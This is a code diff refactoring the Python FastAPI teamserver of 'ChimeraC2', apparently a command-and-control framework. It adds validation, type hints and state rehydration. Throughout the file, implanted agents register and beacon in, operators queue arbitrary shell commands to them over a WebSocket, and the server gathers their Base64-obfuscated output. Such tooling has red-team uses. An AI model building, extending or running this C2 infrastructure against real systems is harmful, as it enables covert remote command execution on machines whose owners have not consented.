@@ -1,30 +1,37 @@
 import asyncio
-import uuid
-import datetime
 import base64
+import datetime
+import uuid
+from typing import Any, Dict, List, Optional
 
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
-from typing import Dict, List
 
 from .db import (
-    init_db,
-    upsert_agent,
-    create_task,
-    mark_task_running,
-    complete_task,
-    get_tasks_for_agent,
-    get_connection,
     add_audit_log,
+    complete_task,
+    create_task,
+    get_agent,
+    get_all_agents,
     get_audit_logs,
+    get_connection,
+    get_pending_tasks,
+    get_tasks_for_agent,
+    init_db,
+    mark_task_running,
+    upsert_agent,
 )
-
+from .models import (
+    AgentRegisterSchema,
+    PollRequestSchema,
+    TaskDispatchSchema,
+    TaskResultSchema,
+)
 
 app = FastAPI(
     title="ChimeraC2 Teamserver",
     version="1.0.0",
 )
-
 
 app.add_middleware(
     CORSMiddleware,
@@ -36,36 +43,26 @@ app.add_middleware(
 
 
 @app.get("/health")
-def health():
+def health() -> Dict[str, str]:
+    """Health check endpoint confirming teamserver responsiveness."""
     return {"status": "ok"}
 
 
 # ============================================================
-# Configuration
+# Configuration & In-Memory Real-Time State
 # ============================================================
 
 AGENT_TIMEOUT = 15
 
-
-# ============================================================
-# In-memory real-time state
-# ============================================================
-
-connected_agents: Dict[str, dict] = {}
-
-task_queues: Dict[str, List[dict]] = {}
-
+# Real-time state dictionaries
+connected_agents: Dict[str, Dict[str, Any]] = {}
+task_queues: Dict[str, List[Dict[str, Any]]] = {}
 active_operators: List[WebSocket] = []
 
 
-# ============================================================
-# Helpers
-# ============================================================
-
-def utc_now():
-    return datetime.datetime.now(
-        datetime.timezone.utc
-    ).isoformat()
+def utc_now() -> str:
+    """Return the current UTC timestamp formatted as ISO 8601 string."""
+    return datetime.datetime.now(datetime.timezone.utc).isoformat()
 
 
 # ============================================================
@@ -73,24 +70,21 @@ def utc_now():
 # ============================================================
 
 class ConnectionManager:
+    """Manages real-time WebSocket subscriber sessions for operators."""
 
-    async def connect(self, websocket: WebSocket):
+    async def connect(self, websocket: WebSocket) -> None:
         await websocket.accept()
-
         if websocket not in active_operators:
             active_operators.append(websocket)
 
-    def disconnect(self, websocket: WebSocket):
+    def disconnect(self, websocket: WebSocket) -> None:
         if websocket in active_operators:
             active_operators.remove(websocket)
 
-    async def broadcast(self, message: dict):
-
+    async def broadcast(self, message: Dict[str, Any]) -> None:
         for connection in active_operators.copy():
-
             try:
                 await connection.send_json(message)
-
             except Exception:
                 self.disconnect(connection)
 
@@ -99,57 +93,86 @@ manager = ConnectionManager()
 
 
 # ============================================================
-# Startup
+# Startup & Rehydration
 # ============================================================
 
-@app.on_event("startup")
-async def startup_event():
+def rehydrate_state() -> None:
+    """
+    Rehydrate in-memory state from SQLite upon server boot.
+    Restores connected_agents fleet records and pending task queues
+    so that server restarts are transparent to connected agents.
+    """
+    persisted_agents = get_all_agents()
+    for agent in persisted_agents:
+        agent_id = agent["agent_id"]
+        # Mark rehydrated nodes as offline until their next beacon poll
+        agent["status"] = "offline"
+        connected_agents[agent_id] = agent
+        if agent_id not in task_queues:
+            task_queues[agent_id] = []
 
-    init_db()
+    pending_tasks = get_pending_tasks()
+    restored_task_count = 0
+    for task in pending_tasks:
+        agent_id = task["agent_id"]
+        if agent_id in task_queues:
+            task_queues[agent_id].append({
+                "task_id": task["task_id"],
+                "command": task["command"],
+            })
+            restored_task_count += 1
 
-    asyncio.create_task(
-        monitor_agents()
+    print(
+        f"[*] Rehydration complete: {len(persisted_agents)} agent(s) and "
+        f"{restored_task_count} pending task(s) loaded into memory."
     )
 
 
+@app.on_event("startup")
+async def startup_event() -> None:
+    """Initialize database tables, rehydrate persistent state, and start monitor task."""
+    init_db()
+    rehydrate_state()
+    asyncio.create_task(monitor_agents())
+
+
 # ============================================================
-# Agent Registration
+# Agent Registration (Pydantic Validated)
 # ============================================================
 
 @app.post("/api/v1/beacon/register")
-async def register_agent(payload: dict):
-
-    agent_id = payload.get("agent_id")
-
-    if not agent_id:
-        return {
-            "status": "error",
-            "message": "agent_id is required",
-        }
-
+async def register_agent(payload: AgentRegisterSchema) -> Dict[str, Any]:
+    """
+    Register a new or returning agent node.
+    Strictly validated via AgentRegisterSchema; missing required fields
+    automatically trigger HTTP 422 Unprocessable Entity.
+    """
+    agent_data = payload.model_dump()
+    agent_id = agent_data["agent_id"]
     now = utc_now()
 
-    payload["last_seen"] = now
-    payload["status"] = "online"
+    agent_data["last_seen"] = now
+    agent_data["status"] = "online"
 
-    connected_agents[agent_id] = payload
-
+    # Update in-memory state
+    connected_agents[agent_id] = agent_data
     if agent_id not in task_queues:
         task_queues[agent_id] = []
 
-    # Persist agent.
-    upsert_agent(payload)
+    # Persist to SQLite with full telemetry
+    upsert_agent(agent_data)
 
-    # Audit registration.
+    # Record registration audit log
     add_audit_log(
         event_type="AGENT_REGISTERED",
         agent_id=agent_id,
-        message=f"Agent {agent_id} registered",
+        message=f"Agent {agent_id} ({agent_data.get('hostname')}) registered",
     )
 
+    # Broadcast event to connected operators
     await manager.broadcast({
         "type": "AGENT_REGISTER",
-        "agent": payload,
+        "agent": agent_data,
     })
 
     return {
@@ -159,39 +182,39 @@ async def register_agent(payload: dict):
 
 
 # ============================================================
-# Agent Poll / Heartbeat
+# Agent Poll / Heartbeat (Pydantic Validated)
 # ============================================================
 
 @app.post("/api/v1/beacon/poll")
-async def poll_tasks(payload: dict):
+async def poll_tasks(payload: PollRequestSchema) -> Dict[str, Any]:
+    """
+    Process beacon polling and heartbeat check-in from agents.
+    Strictly validated via PollRequestSchema.
+    Returns queued command or empty task object.
+    """
+    agent_id = payload.agent_id
 
-    agent_id = payload.get("agent_id")
-
-    if not agent_id:
-        return {
-            "task": None,
-            "error": "agent_id is required",
-        }
-
+    # If unrecognized in memory, attempt fallback to SQLite persistence
     if agent_id not in connected_agents:
-        return {
-            "task": None,
-            "error": "unknown agent_id",
-        }
+        persisted = get_agent(agent_id)
+        if persisted:
+            connected_agents[agent_id] = persisted
+            if agent_id not in task_queues:
+                task_queues[agent_id] = []
+        else:
+            return {
+                "task": None,
+                "error": "unknown agent_id",
+            }
 
     now = utc_now()
-
     agent = connected_agents[agent_id]
-
-    previous_status = agent.get(
-        "status",
-        "offline",
-    )
+    previous_status = agent.get("status", "offline")
 
     agent["last_seen"] = now
     agent["status"] = "online"
 
-    # Persist heartbeat.
+    # Persist heartbeat check-in
     upsert_agent(agent)
 
     await manager.broadcast({
@@ -201,41 +224,28 @@ async def poll_tasks(payload: dict):
         "status": "online",
     })
 
-    # Agent came back online.
+    # Transition to online audit and notification
     if previous_status == "offline":
-
         add_audit_log(
             event_type="AGENT_ONLINE",
             agent_id=agent_id,
             message=f"Agent {agent_id} came back online",
         )
-
         await manager.broadcast({
             "type": "AGENT_REGISTER",
             "agent": agent,
         })
 
-    # --------------------------------------------------------
-    # Deliver queued task
-    # --------------------------------------------------------
-
+    # Deliver queued task if available
     if task_queues.get(agent_id):
-
         task = task_queues[agent_id].pop(0)
+        mark_task_running(task["task_id"])
 
-        mark_task_running(
-            task["task_id"]
-        )
-
-        # Audit task running.
         add_audit_log(
             event_type="TASK_RUNNING",
             agent_id=agent_id,
             task_id=task["task_id"],
-            message=(
-                f"Task {task['task_id']} "
-                f"started running"
-            ),
+            message=f"Task {task['task_id']} started running",
         )
 
         return {
@@ -248,85 +258,56 @@ async def poll_tasks(payload: dict):
 
 
 # ============================================================
-# Task Result
+# Task Result (Pydantic Validated)
 # ============================================================
 
 @app.post("/api/v1/beacon/result")
-async def receive_result(payload: dict):
+async def receive_result(payload: TaskResultSchema) -> Dict[str, Any]:
+    """
+    Receive and persist command execution output from agents.
+    Strictly validated via TaskResultSchema; decodes Base64 obfuscated output.
+    """
+    result_data = payload.model_dump()
+    agent_id = result_data["agent_id"]
+    task_id = result_data["task_id"]
+    output = result_data.get("output", "")
+    exit_code = result_data.get("exit_code", -1)
 
-    agent_id = payload.get("agent_id")
-
-    task_id = payload.get("task_id")
-
-    output = payload.get(
-        "output",
-        "",
-    )
-
-    exit_code = payload.get(
-        "exit_code",
-        -1,
-    )
-
-    # Decode Base64 when applicable.
+    # Decode Base64 obfuscation when applicable with raw fallback
     try:
-
-        decoded_output = base64.b64decode(
-            output,
-            validate=True,
-        ).decode("utf-8")
-
+        decoded_output = base64.b64decode(output, validate=True).decode("utf-8")
     except Exception:
-
         decoded_output = output
 
-    payload["decoded_output"] = decoded_output
+    result_data["decoded_output"] = decoded_output
 
-    # --------------------------------------------------------
-    # Persist task result
-    # --------------------------------------------------------
-
+    # Persist completion in database
     if task_id:
-
         complete_task(
             task_id=task_id,
             output=decoded_output,
             exit_code=exit_code,
         )
 
-        if exit_code == 0:
-            event_type = "TASK_COMPLETED"
-        else:
-            event_type = "TASK_FAILED"
-
+        event_type = "TASK_COMPLETED" if exit_code == 0 else "TASK_FAILED"
         add_audit_log(
             event_type=event_type,
             agent_id=agent_id,
             task_id=task_id,
-            message=(
-                f"Task {task_id} finished "
-                f"with exit code {exit_code}"
-            ),
+            message=f"Task {task_id} finished with exit code {exit_code}",
         )
 
-    # --------------------------------------------------------
-    # Keep agent online
-    # --------------------------------------------------------
-
+    # Keep agent marked online
     if agent_id in connected_agents:
-
         now = utc_now()
-
         connected_agents[agent_id]["last_seen"] = now
         connected_agents[agent_id]["status"] = "online"
+        upsert_agent(connected_agents[agent_id])
 
-        upsert_agent(
-            connected_agents[agent_id]
-        )
-
+    # Broadcast task result to dashboard operators
     await manager.broadcast({
         "type": "TASK_RESULT",
-        "result": payload,
+        "result": result_data,
     })
 
     return {
@@ -335,24 +316,18 @@ async def receive_result(payload: dict):
 
 
 # ============================================================
-# Task History API
+# Task History REST API
 # ============================================================
 
 @app.get("/api/v1/tasks")
 async def get_task_history(
-    agent_id: str | None = None,
-):
-
+    agent_id: Optional[str] = None,
+) -> Dict[str, Any]:
+    """Fetch task history optionally filtered by agent_id."""
     if agent_id:
-
-        tasks = get_tasks_for_agent(
-            agent_id
-        )
-
+        tasks = get_tasks_for_agent(agent_id)
     else:
-
         conn = get_connection()
-
         rows = conn.execute(
             """
             SELECT *
@@ -360,13 +335,8 @@ async def get_task_history(
             ORDER BY created_at DESC
             """
         ).fetchall()
-
         conn.close()
-
-        tasks = [
-            dict(row)
-            for row in rows
-        ]
+        tasks = [dict(row) for row in rows]
 
     return {
         "count": len(tasks),
@@ -375,28 +345,22 @@ async def get_task_history(
 
 
 # ============================================================
-# Audit History API
+# Audit History REST API
 # ============================================================
 
 @app.get("/api/v1/audit")
 async def audit_history(
-    agent_id: str | None = None,
-    task_id: str | None = None,
+    agent_id: Optional[str] = None,
+    task_id: Optional[str] = None,
     limit: int = 100,
-):
-
-    # Prevent excessively large responses.
-    limit = max(
-        1,
-        min(limit, 500),
-    )
-
+) -> Dict[str, Any]:
+    """Fetch recent audit events with bounded pagination."""
+    bounded_limit = max(1, min(limit, 500))
     logs = get_audit_logs(
         agent_id=agent_id,
         task_id=task_id,
-        limit=limit,
+        limit=bounded_limit,
     )
-
     return {
         "count": len(logs),
         "logs": logs,
@@ -404,68 +368,35 @@ async def audit_history(
 
 
 # ============================================================
-# Agent Offline Monitor
+# Agent Inactivity Background Monitor
 # ============================================================
 
-async def monitor_agents():
-
+async def monitor_agents() -> None:
+    """Background task checking agent check-in recency and broadcasting disconnects."""
     while True:
-
         await asyncio.sleep(5)
-
-        now = datetime.datetime.now(
-            datetime.timezone.utc
-        )
+        now = datetime.datetime.now(datetime.timezone.utc)
 
         for agent_id, agent in connected_agents.items():
-
-            last_seen_string = agent.get(
-                "last_seen"
-            )
-
+            last_seen_string = agent.get("last_seen")
             if not last_seen_string:
                 continue
 
             try:
-
-                last_seen = datetime.datetime.fromisoformat(
-                    last_seen_string
-                )
-
+                last_seen = datetime.datetime.fromisoformat(last_seen_string)
                 if last_seen.tzinfo is None:
-
-                    last_seen = last_seen.replace(
-                        tzinfo=datetime.timezone.utc
-                    )
-
-                age = (
-                    now - last_seen
-                ).total_seconds()
-
+                    last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
+                age = (now - last_seen).total_seconds()
             except Exception:
-
                 continue
 
-            # ------------------------------------------------
-            # Agent became offline
-            # ------------------------------------------------
-
-            if (
-                age > AGENT_TIMEOUT
-                and agent.get("status") != "offline"
-            ):
-
+            if age > AGENT_TIMEOUT and agent.get("status") != "offline":
                 agent["status"] = "offline"
-
                 add_audit_log(
                     event_type="AGENT_OFFLINE",
                     agent_id=agent_id,
-                    message=(
-                        f"Agent {agent_id} "
-                        f"went offline"
-                    ),
+                    message=f"Agent {agent_id} went offline",
                 )
-
                 await manager.broadcast({
                     "type": "AGENT_DISCONNECT",
                     "agent_id": agent_id,
@@ -475,126 +406,78 @@ async def monitor_agents():
 
 
 # ============================================================
-# Operator WebSocket
+# Operator WebSocket Dispatcher
 # ============================================================
 
 @app.websocket("/ws/operator")
-async def operator_websocket(
-    websocket: WebSocket
-):
-
+async def operator_websocket(websocket: WebSocket) -> None:
+    """WebSocket endpoint connecting Mission Control operator interfaces."""
     await manager.connect(websocket)
 
     try:
-
-        # ----------------------------------------------------
-        # Send current fleet
-        # ----------------------------------------------------
-
+        # Initial fleet hydration: send all known agents
         for agent in connected_agents.values():
-
             await websocket.send_json({
                 "type": "AGENT_REGISTER",
                 "agent": agent,
             })
 
-        # ----------------------------------------------------
-        # Operator messages
-        # ----------------------------------------------------
-
         while True:
-
             data = await websocket.receive_json()
-
             if data.get("action") != "exec":
                 continue
 
-            t_agent = data.get(
-                "agent_id"
-            )
+            target_agent = data.get("agent_id")
+            command = data.get("command")
 
-            command = data.get(
-                "command"
-            )
-
-            if not t_agent or not command:
-
+            if not target_agent or not command:
                 await websocket.send_json({
                     "type": "ERROR",
-                    "message": (
-                        "agent_id and command "
-                        "are required"
-                    ),
+                    "message": "agent_id and command are required",
                 })
-
                 continue
 
-            if t_agent not in task_queues:
+            if target_agent not in task_queues:
+                # If agent is in connected_agents but not task_queues, initialize queue
+                if target_agent in connected_agents:
+                    task_queues[target_agent] = []
+                else:
+                    await websocket.send_json({
+                        "type": "ERROR",
+                        "message": "Unknown agent_id",
+                        "agent_id": target_agent,
+                    })
+                    continue
 
-                await websocket.send_json({
-                    "type": "ERROR",
-                    "message": "Unknown agent_id",
-                    "agent_id": t_agent,
-                })
-
-                continue
-
-            # ------------------------------------------------
-            # Generate task ID
-            # ------------------------------------------------
-
-            t_id = (
-                f"task-"
-                f"{uuid.uuid4().hex[:6]}"
-            )
-
+            task_id = f"task-{uuid.uuid4().hex[:6]}"
             new_task = {
-                "task_id": t_id,
+                "task_id": task_id,
                 "command": command,
             }
 
-            # ------------------------------------------------
-            # Persist task
-            # ------------------------------------------------
-
             create_task(
-                task_id=t_id,
-                agent_id=t_agent,
+                task_id=task_id,
+                agent_id=target_agent,
                 command=command,
             )
 
-            # ------------------------------------------------
-            # Audit task creation
-            # ------------------------------------------------
-
             add_audit_log(
                 event_type="TASK_CREATED",
-                agent_id=t_agent,
-                task_id=t_id,
-                message=(
-                    f"Task {t_id} created "
-                    f"for agent {t_agent}"
-                ),
+                agent_id=target_agent,
+                task_id=task_id,
+                message=f"Task {task_id} created for agent {target_agent}",
             )
 
-            # ------------------------------------------------
-            # Add to real-time queue
-            # ------------------------------------------------
-
-            task_queues[t_agent].append(
-                new_task
-            )
+            task_queues[target_agent].append(new_task)
 
             await manager.broadcast({
                 "type": "TASK_QUEUED",
-                "task_id": t_id,
-                "agent_id": t_agent,
+                "task_id": task_id,
+                "agent_id": target_agent,
                 "command": command,
             })
 
     except WebSocketDisconnect:
         manager.disconnect(websocket)
-
     except Exception:
-
         manager.disconnect(websocket)
